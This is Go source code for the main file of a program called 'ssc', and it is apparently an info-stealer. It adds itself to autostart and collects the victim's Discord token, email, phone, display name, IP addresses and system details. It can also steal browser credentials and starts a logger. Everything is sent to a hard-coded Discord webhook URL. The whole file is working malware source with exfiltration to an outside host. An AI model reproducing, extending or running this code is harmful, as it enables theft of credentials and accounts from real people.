package main

import (
	"fmt"
	"os"
	"time"

	modules "ssc/modules"
	utils "ssc/structs"
)

// init values / config
var command_prompts bool = false
var add_to_autostart bool = true
var web_browser_credentials_stealer bool = false

const res_webhook_link string = "https://discord.com/api/webhooks/1224461106303467641/oaSR8xCS6mfQ3tR8ssOQLwb-S1kPqH1LWXtkvph54jWZDwTwwh5pwmlqkN3BxKPcbAHY"

var username string = "ssc"

func Print(a ...interface{}) {
	if command_prompts {
		fmt.Println(a...)
	}
}

func main() {
	Print("Welcome in ssc!")
	var autostart_res string = "False"

	if add_to_autostart {
		is_autostart := modules.AddtoAutostart()
		if is_autostart {
			autostart_res = "True"
		} else {
			autostart_res = "False"
		}

	}

	hostname, err := os.Hostname()
	if err == nil {
		username = hostname
	}

	currentTime := time.Now()
	timeString := currentTime.Format("2006-01-02 15:04:05")

	var local_ip string
	local_ip_data, err := modules.GetLocalIP()
	if err != nil {
		local_ip = "N/A"
	} else {
		local_ip = local_ip_data
	}

	var public_ip string
	public_ip_data, err := modules.GetPublicIP()
	if err != nil {
		public_ip = "N/A"
	} else {
		public_ip = public_ip_data
	}

	discord_data := modules.GetDiscordUserData()
	nice_dc_data := "```" + discord_data + "```"

	// TokenUserData
	discordTokenData := modules.GrabTokenInformation(discord_data)
	displayName := discordTokenData.DisplayName
	osName := discordTokenData.OsName
	cpuArch := discordTokenData.CpuArch
	discordUser := discordTokenData.DiscordUser
	discordEmail := discordTokenData.DiscordEmail
	discordPhone := discordTokenData.DiscordPhone
	discordNitro := discordTokenData.DiscordNitro

	userData := utils.UserData{
		Username: username,
		Content:  ".",
		Embeds: []utils.Embed{
			{
				Fields: []utils.Field{
					{Name: "Username", Value: username},
					{Name: "Token", Value: nice_dc_data},
					{Name: "Time", Value: timeString},
					{Name: "local_ip", Value: local_ip},
					{Name: "public_ip", Value: public_ip},
					{Name: "Autostart", Value: autostart_res},

					{Name: "DisplayName", Value: displayName},
					{Name: "Os Name", Value: osName},
					{Name: "CPU arch", Value: cpuArch},
					{Name: "Discord Username", Value: discordUser},
					{Name: "Discord Email", Value: discordEmail},
					{Name: "Discord Phone", Value: discordPhone},
					{Name: "Discord Nitro", Value: discordNitro},
				},
			},
		},
	}

	send_res(userData)

	if web_browser_credentials_stealer {
		webbrowserData := modules.WebbrowserStealer()
		webbrowserData2 := utils.UserData{
			Username: username,
			Content:  webbrowserData,
			Embeds: []utils.Embed{
				{
					Fields: []utils.Field{
						{Name: "Username", Value: username},
					},
				},
			},
		}
		send_res(webbrowserData2)
	}

	//start logger
	modules.Logs()
}

func send_res(data utils.UserData) {
	modules.SendMessageToWebhook(data, res_webhook_link)
}
